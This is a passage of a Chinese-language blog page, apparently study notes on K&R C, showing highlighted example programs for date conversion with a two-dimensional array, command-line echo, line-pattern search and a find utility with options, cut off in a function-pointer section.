class=\"number\">1</span>,<span class=\"number\">6</span>,<span class=\"number\">8</span>,<span class=\"number\">4</span></span><br><span class=\"line\">    <span class=\"number\">7</span>,<span class=\"number\">2</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">3</span>,<span class=\"number\">9</span>,<span class=\"number\">8</span>,<span class=\"number\">1</span>,<span class=\"number\">6</span>,<span class=\"number\">8</span>,<span class=\"number\">4</span></span><br><span class=\"line\">    <span class=\"number\">7</span>,<span class=\"number\">2</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">3</span>,<span class=\"number\">1</span>,<span class=\"number\">8</span>,<span class=\"number\">9</span>,<span class=\"number\">6</span>,<span class=\"number\">8</span>,<span class=\"number\">4</span></span><br><span class=\"line\">    <span class=\"number\">7</span>,<span class=\"number\">2</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">3</span>,<span class=\"number\">1</span>,<span class=\"number\">6</span>,<span class=\"number\">9</span>,<span class=\"number\">8</span>,<span class=\"number\">8</span>,<span class=\"number\">4</span></span><br><span class=\"line\">    <span class=\"number\">7</span>,<span class=\"number\">2</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"number\">3</span>,<span class=\"number\">1</span>,<span class=\"number\">6</span>,<span class=\"number\">4</span>,<span class=\"number\">8</span>,<span class=\"number\">8</span>,<span class=\"number\">9</span> <span class=\"comment\">//此时last在4这个位置,肯定也是比它小的,而且是最后一个,此时再swap就可以了</span></span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"多维数组\"><a href=\"#多维数组\" class=\"headerlink\" title=\"多维数组\"></a>多维数组</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">day_of_year</span><span class=\"params\">(<span class=\"type\">int</span> year, <span class=\"type\">int</span> month,<span class=\"type\">int</span> day)</span>;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">month_day</span><span class=\"params\">(<span class=\"type\">int</span> year,<span class=\"type\">int</span> yearday,<span class=\"type\">int</span> *pmonth,<span class=\"type\">int</span> *pday)</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> choice;</span><br><span class=\"line\">    <span class=\"type\">int</span> year,month,day;</span><br><span class=\"line\">    <span class=\"type\">int</span> dayofyear;</span><br><span class=\"line\">    <span class=\"type\">int</span> dayofmonth;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;请输入选项\\n1.将某年某月某日的日期表示形式转换成某年第几天的形式\\n2.将某年中第几天的日期表示形式转换为某月某日\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d&quot;</span>,&amp;choice);</span><br><span class=\"line\">    <span class=\"keyword\">switch</span>(choice)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">            <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;请输入年月日,空格隔开\\n&quot;</span>);</span><br><span class=\"line\">            <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d %d %d&quot;</span>,&amp;year,&amp;month,&amp;day);</span><br><span class=\"line\">            dayofyear = day_of_year(year,month,day);</span><br><span class=\"line\">            <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d年%d月%d日是%d年第%d天\\n&quot;</span>,year,month,day,year,dayofyear);</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        <span class=\"keyword\">case</span> <span class=\"number\">2</span>:</span><br><span class=\"line\">            <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;请输入年份和天数,空格隔开\\n&quot;</span>);</span><br><span class=\"line\">            <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d %d&quot;</span>,&amp;year,&amp;day);</span><br><span class=\"line\">            month_day(year,day,&amp;month,&amp;dayofmonth);</span><br><span class=\"line\">            <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d年第%d天是%d年%d月%d号&quot;</span>,year,day,year,month,dayofmonth);</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">char</span> daytab[<span class=\"number\">2</span>][<span class=\"number\">13</span>]=&#123;</span><br><span class=\"line\">    &#123;<span class=\"number\">0</span>,<span class=\"number\">31</span>,<span class=\"number\">28</span>,<span class=\"number\">31</span>,<span class=\"number\">30</span>,<span class=\"number\">31</span>,<span class=\"number\">30</span>,<span class=\"number\">31</span>,<span class=\"number\">31</span>,<span class=\"number\">30</span>,<span class=\"number\">31</span>,<span class=\"number\">30</span>,<span class=\"number\">31</span>&#125;,</span><br><span class=\"line\">    &#123;<span class=\"number\">0</span>,<span class=\"number\">31</span>,<span class=\"number\">29</span>,<span class=\"number\">31</span>,<span class=\"number\">30</span>,<span class=\"number\">31</span>,<span class=\"number\">30</span>,<span class=\"number\">31</span>,<span class=\"number\">31</span>,<span class=\"number\">30</span>,<span class=\"number\">31</span>,<span class=\"number\">30</span>,<span class=\"number\">31</span>&#125;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//将某年某月某日的日期表示形式转换成某年第几天的形式</span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">day_of_year</span><span class=\"params\">(<span class=\"type\">int</span> year, <span class=\"type\">int</span> month,<span class=\"type\">int</span> day)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> i,leap;</span><br><span class=\"line\">    </span><br><span class=\"line\">    leap = year%<span class=\"number\">4</span> == <span class=\"number\">0</span> &amp;&amp; year%<span class=\"number\">100</span> !=<span class=\"number\">0</span> || year % <span class=\"number\">400</span> ==<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(i=<span class=\"number\">1</span>;i&lt; month;i++)</span><br><span class=\"line\">        day+= daytab[leap][i];</span><br><span class=\"line\">    <span class=\"keyword\">return</span> day;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//将某年中第几天的日期表示形式转换为某月某日</span></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">month_day</span><span class=\"params\">(<span class=\"type\">int</span> year,<span class=\"type\">int</span> yearday,<span class=\"type\">int</span> *pmonth,<span class=\"type\">int</span> *pday)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> i,leap;</span><br><span class=\"line\">    </span><br><span class=\"line\">    leap = year%<span class=\"number\">4</span> == <span class=\"number\">0</span> &amp;&amp; year%<span class=\"number\">100</span> !=<span class=\"number\">0</span> || year % <span class=\"number\">400</span> ==<span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (i=<span class=\"number\">1</span>;yearday &gt; daytab[leap][i];i++)</span><br><span class=\"line\">        yearday -= daytab[leap][i];</span><br><span class=\"line\">    *pmonth = i;</span><br><span class=\"line\">    *pday = yearday;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n<h2 id=\"命令行参数-echo\"><a href=\"#命令行参数-echo\" class=\"headerlink\" title=\"命令行参数 echo\"></a>命令行参数 echo</h2><p>第一个版本将argv看成一个字符指针数组</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc,<span class=\"type\">char</span> *argv[])</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> i;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">for</span> (i=<span class=\"number\">0</span>; i&lt;argc; i++)</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s%s&quot;</span>,argv[i],(i &lt; argc<span class=\"number\">-1</span>) ? <span class=\"string\">&quot; &quot;</span>: <span class=\"string\">&quot;&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>因为argv是一个指向指针数组的指针,所以,可以通过指针而非数组下标的方式处理命令行参数.</p>\n<p>第二个版本是在对argv进行自增运算、对argc进行自减运算的基础上实现的(argv是一个指向char类型的指针的指针)</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc,<span class=\"type\">char</span> *argv[])</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>( --argc &gt; <span class=\"number\">0</span>)</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s%s&quot;</span>,*++argv,(argc &gt; <span class=\"number\">1</span>)? <span class=\"string\">&quot; &quot;</span>:<span class=\"string\">&quot;&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"模式查找程序\"><a href=\"#模式查找程序\" class=\"headerlink\" title=\"模式查找程序\"></a>模式查找程序</h3><p>4.1节  内置了查找模式</p>\n<p>​\t\t将输入中包含特定“模式”或字符串的各行打印出来(grep的特例相当于)</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> MAXLINE 1000</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">getline1</span><span class=\"params\">(<span class=\"type\">char</span> line[],<span class=\"type\">int</span> max)</span>;</span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">strindex</span><span class=\"params\">(<span class=\"type\">char</span> source[],<span class=\"type\">char</span> searchfor[])</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"type\">char</span> pattern[] = <span class=\"string\">&quot;tang&quot;</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">char</span> line[MAXLINE];</span><br><span class=\"line\">    <span class=\"type\">int</span> found = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> (getline1(line,MAXLINE) &gt; <span class=\"number\">0</span> )</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(strindex(line,pattern) &gt;= <span class=\"number\">0</span> )&#123;</span><br><span class=\"line\">            <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s&quot;</span>,line);</span><br><span class=\"line\">            found++;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> found;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//将行保存到s中,并返回该行的长度</span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">getline1</span><span class=\"params\">(<span class=\"type\">char</span> s[],<span class=\"type\">int</span> lim)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> c,i;</span><br><span class=\"line\">    i = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(--lim &gt;<span class=\"number\">0</span> &amp;&amp; (c=getchar()) != EOF &amp;&amp; c != <span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">        s[i++] = c;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(c==<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">        s[i++] = c;</span><br><span class=\"line\">    s[i] = <span class=\"string\">&#x27;\\0&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> i;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 返回t在s中的位置,如果没找到返回-1</span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">strindex</span><span class=\"params\">(<span class=\"type\">char</span> s[],<span class=\"type\">char</span> t[])</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> i,j,k;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">for</span> (i=<span class=\"number\">0</span>; s[i] !=<span class=\"string\">&#x27;\\0&#x27;</span>;i++)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(j = i,k=<span class=\"number\">0</span>; t[k]!=<span class=\"string\">&#x27;\\0&#x27;</span> &amp;&amp; s[j]==t[k];j++,k++)</span><br><span class=\"line\">            ;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (k &gt; <span class=\"number\">0</span> &amp;&amp; t[k] == <span class=\"string\">&#x27;\\0&#x27;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> i;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>5.10 增强版 实现find功能,打印与第一个参数指定的模式匹配的行</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> MAXLINE 1000</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">getline1</span><span class=\"params\">(<span class=\"type\">char</span> *line, <span class=\"type\">int</span> max)</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc,<span class=\"type\">char</span> *argv[])</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">char</span> line[MAXLINE];</span><br><span class=\"line\">    <span class=\"type\">int</span> found = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (argc !=<span class=\"number\">2</span> )</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Usage: find pattern\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span>(getline1(line,MAXLINE) &gt; <span class=\"number\">0</span>)</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"built_in\">strstr</span>(line,argv[<span class=\"number\">1</span>]) != <span class=\"literal\">NULL</span>)&#123;</span><br><span class=\"line\">                <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s&quot;</span>,line);</span><br><span class=\"line\">                found++;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> found;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">getline1</span><span class=\"params\">(<span class=\"type\">char</span> s[],<span class=\"type\">int</span> lim)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> c,i;</span><br><span class=\"line\">    i = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(--lim &gt;<span class=\"number\">0</span> &amp;&amp; (c=getchar()) != EOF &amp;&amp; c != <span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">        s[i++] = c;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(c==<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">        s[i++] = c;</span><br><span class=\"line\">    s[i] = <span class=\"string\">&#x27;\\0&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> i;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<p>再次改进</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> MAXLINE 1000</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">getline1</span><span class=\"params\">(<span class=\"type\">char</span> *line, <span class=\"type\">int</span> max)</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc,<span class=\"type\">char</span> *argv[])</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">char</span> line[MAXLINE];</span><br><span class=\"line\">    <span class=\"type\">long</span> lineno = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"type\">int</span> c,except = <span class=\"number\">0</span>, number = <span class=\"number\">0</span>, found =<span class=\"number\">0</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">while</span>(--argc &gt; <span class=\"number\">0</span> &amp;&amp; (*++argv)[<span class=\"number\">0</span>] == <span class=\"string\">&#x27;-&#x27;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">while</span>(c = *++argv[<span class=\"number\">0</span>])   <span class=\"comment\">//这里的++...........是那个意思?</span></span><br><span class=\"line\">            <span class=\"keyword\">switch</span>(c)&#123;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> <span class=\"string\">&#x27;x&#x27;</span>:</span><br><span class=\"line\">                    except = <span class=\"number\">1</span>;</span><br><span class=\"line\">                    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                <span class=\"keyword\">case</span> <span class=\"string\">&#x27;n&#x27;</span>:</span><br><span class=\"line\">                    number = <span class=\"number\">1</span>;</span><br><span class=\"line\">                    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                <span class=\"keyword\">default</span>:</span><br><span class=\"line\">                    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;find: illegal option %c\\n&quot;</span>,c);</span><br><span class=\"line\">                    argc = <span class=\"number\">0</span>;</span><br><span class=\"line\">                    found = <span class=\"number\">-1</span>;</span><br><span class=\"line\">                    <span class=\"keyword\">break</span>;       </span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">if</span> (argc !=<span class=\"number\">1</span> )</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Usage: find -x -n pattern\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span>(getline1(line,MAXLINE) &gt; <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">         \tlineno++;   </span><br><span class=\"line\">            <span class=\"keyword\">if</span> ((<span class=\"built_in\">strstr</span>(line,*argv) != <span class=\"literal\">NULL</span>)!= except)&#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(number)</span><br><span class=\"line\">                    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%ld:&quot;</span>,lineno);</span><br><span class=\"line\">                <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%s&quot;</span>,line);</span><br><span class=\"line\">                found++;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> found;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">getline1</span><span class=\"params\">(<span class=\"type\">char</span> s[],<span class=\"type\">int</span> lim)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> c,i;</span><br><span class=\"line\">    i = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(--lim &gt;<span class=\"number\">0</span> &amp;&amp; (c=getchar()) != EOF &amp;&amp; c != <span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">        s[i++] = c;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(c==<span class=\"string\">&#x27;\\n&#x27;</span>)</span><br><span class=\"line\">        s[i++] = c;</span><br><span class=\"line\">    s[i] = <span class=\"string\">&#x27;\\0&#x27;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> i;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"函数指针\"><a href=\"#函数指针\" class=\"headerlink\" title=\"函数指针\"></a>函数指针</h3><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span 